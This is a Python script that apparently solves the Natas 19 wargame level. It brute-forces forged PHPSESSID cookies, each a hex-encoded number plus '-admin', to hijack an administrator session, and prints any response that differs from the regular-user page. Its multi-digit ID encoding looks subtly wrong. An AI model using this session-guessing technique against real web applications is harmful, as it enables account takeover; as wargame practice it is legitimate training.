from itertools import cycle
from multiprocessing.pool import ThreadPool
import random
import string
import itertools
from natas import Natas
import binascii


def combine_phpsessid(prefix, username):
            prefix = ''.join(str(i) for i in prefix)
            prefix = '3' + str(prefix) + '2d'
            hash_ = binascii.hexlify(username.encode('ascii'))
            hash_ = hash_.decode('ascii')
            return prefix + hash_


def main():
    natas = Natas('natas19', keep_session=True)

    post = {
            'username': 'admin',
            'password': 'dupa'
            }

    get = {
            'debug': 'true'
            }

    for username in ('admin',):
        for i in range(1, 6):
            for perm in itertools.permutations(range(1, 10), i):
                phpsessid = combine_phpsessid(perm, username)
                natas.renew_session()
                natas.set_cookie('PHPSESSID', phpsessid)
                resp = natas.get_response(return_raw_response=True, post_data=post, get_data=get)
                text = resp.text
                print(phpsessid)
                if 'regular user' not in text:
                    print(text)


if __name__ == '__main__':
    main()
